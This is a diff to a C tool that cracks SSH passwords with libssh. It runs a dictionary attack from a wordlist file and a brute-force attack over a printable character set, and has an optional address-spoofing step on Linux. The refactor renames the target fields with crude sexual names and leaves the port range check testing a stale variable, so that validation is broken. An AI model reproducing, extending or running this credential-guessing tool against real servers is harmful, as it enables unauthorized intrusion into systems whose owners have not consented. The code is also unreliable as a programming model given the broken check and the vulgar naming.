@@ -5,6 +5,7 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
+#include <pthread.h>
 #include <libssh/libssh.h>
 #if _WIN32
 #define cls "cls"   /* Do windows stuff */
@@ -22,6 +23,15 @@
 #define cls "clear" /* If you are not sure, make it a Linux command. */
 #endif
 #define MAXLEN 1024
+
+pthread_mutex_t mutex;
+
+//エロい構造(体)
+struct hentai {
+    char *hotel; //ip
+    char *jk;    //name
+    int vagina;  //port
+} otintin;
 
 //見たとおり。
 void logo() {
@@ -144,7 +154,7 @@ int show_remote_processes(ssh_session session) {
 }
 
 //ssh接続
-int ssh_main_connection(char host[], char name[], int port, char password[]) {
+int ssh_main_connection(char password[]) {
     char key[strlen(password) + 1];
     int rc;
     size_t i;
@@ -154,9 +164,9 @@ int ssh_main_connection(char host[], char name[], int port, char password[]) {
 
     for (i = 0; i <= strlen(password); i++) key[i] = (char)password[i];
     
-    ssh_options_set(my_ssh_session, SSH_OPTIONS_HOST, host);
-    ssh_options_set(my_ssh_session, SSH_OPTIONS_USER, name);
-    ssh_options_set(my_ssh_session, SSH_OPTIONS_PORT, &port);
+    ssh_options_set(my_ssh_session, SSH_OPTIONS_HOST, otintin.hotel);
+    ssh_options_set(my_ssh_session, SSH_OPTIONS_USER, otintin.jk);
+    ssh_options_set(my_ssh_session, SSH_OPTIONS_PORT, &otintin.vagina);
     ssh_options_set(my_ssh_session, SSH_OPTIONS_CIPHERS_C_S, "aes128-ctr");
     
     if ((rc = ssh_connect(my_ssh_session)) != SSH_OK) {
@@ -186,17 +196,10 @@ int ssh_main_connection(char host[], char name[], int port, char password[]) {
 }
 
 //辞書攻撃
-void dictionary_attack(char host[], char name[], int *port) {
-    int (*p_func)(char*, char*, int, char*) = &ssh_main_connection;
-    char ip[strlen(host) + 1];
-    char user[strlen(name) + 1];
+void dictionary_attack() {
+    int (*p_func)(char*) = &ssh_main_connection;
     char filename[256], str[MAXLEN] = {0};
     int logical = -1;
-    size_t i;
-    if (port == NULL) {
-        printf("Error: port is NULL\n");
-        exit(1);
-    }
     logo();
     printf("\nEnter a file name.\n: ");
     fgets(filename, sizeof(filename), stdin);
@@ -213,15 +216,13 @@ void dictionary_attack(char host[], char name[], int *port) {
         printf("Error: Could not open file.\n");
         exit(1);
     }
-    printf("\nAnalyzing %s password...\n", host);
-    for (i = 0; i <= strlen(host); i++) ip[i] = host[i];
-    for (i = 0; i <= strlen(name); i++) user[i] = name[i];
+    printf("\nAnalyzing %s password...\n", otintin.hotel);
     while (fgets(str, MAXLEN, fp) != NULL) {
 #if __linux__
         if (bol[0] == 'y') fake_ip();
 #endif
         str[strcspn(str, "\n")] = 0;
-        if ((*p_func)(ip, user, *port, str) == 0) {
+        if ((*p_func)(str) == 0) {
             logical = 1;
             break;
         }
@@ -234,15 +235,12 @@ void dictionary_attack(char host[], char name[], int *port) {
 }
 
 //総当たり攻撃
-void brute_force_attack(char host[], char name[], int *port) {
-    int (*p_func)(char*, char*, int, char*) = &ssh_main_connection;
+void brute_force_attack() {
+    int (*p_func)(char*) = &ssh_main_connection;
     const char *x = "1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!\"#$%&\')(-=^~|[{@`]}:*;+_\\/.,>< ";
-    char ip[strlen(host) + 1];
-    char user[strlen(name) + 1];
     char str[MAXLEN + 1] = {0};
     int index[MAXLEN + 1] = {0};
     int i, carry;
-    size_t j;
 #if __linux__
     char bol[2];
     logo();
@@ -250,14 +248,12 @@ void brute_force_attack(char host[], char name[], int *port) {
     fgets(bol, sizeof(bol), stdin);
     bol[strcspn(bol, "\n")] = 0;
 #endif
-    for (j = 0; j <= strlen(host); j++) ip[j] = host[j];
-    for (j = 0; j <= strlen(name); j++) user[j] = name[j];
-    printf("\nAnalyzing %s password...\n", host);
+    printf("\nAnalyzing %s password...\n", otintin.hotel);
     do {
 #if __linux__
         if (bol[0] == 'y') fake_ip();
 #endif
-        if ((*p_func)(ip, user, *port, str) == 0) {
+        if ((*p_func)(str) == 0) {
             break;
         }
         for(i = 0, index[i]++, carry = !0; carry; i++) {
@@ -281,28 +277,31 @@ int main(int argc, char* argv[]) {
         return 1;
     }
     
-    port = atoi(argv[4]);
+    otintin.vagina = atoi(argv[4]);
     if (port < 0 || port > 65535) {
         printf("Error: Do you know what a short type is?\n");
         return 1;
     }
     
     logo();
+
+    otintin.hotel = argv[2];
+    otintin.jk = argv[6];
     
     puts("\n 1: brute force attack");
     puts(" 2: dictionary attack");
     printf("[*] Select Mode [1/2]: ");
     fgets(c_mode, sizeof(c_mode), stdin);
     if (c_mode[0] == '\n') {
-        dictionary_attack(argv[2], argv[6], &port);
+        dictionary_attack();
     }
     mode = atoi(c_mode);
     switch (mode) {
     case 1:
-        brute_force_attack(argv[2], argv[6], &port);
+        brute_force_attack();
         break;
     case 2:
-        dictionary_attack(argv[2], argv[6], &port);
+        dictionary_attack();
         break;
     default:
         printf("Error: Do you know what an integer is?\n");
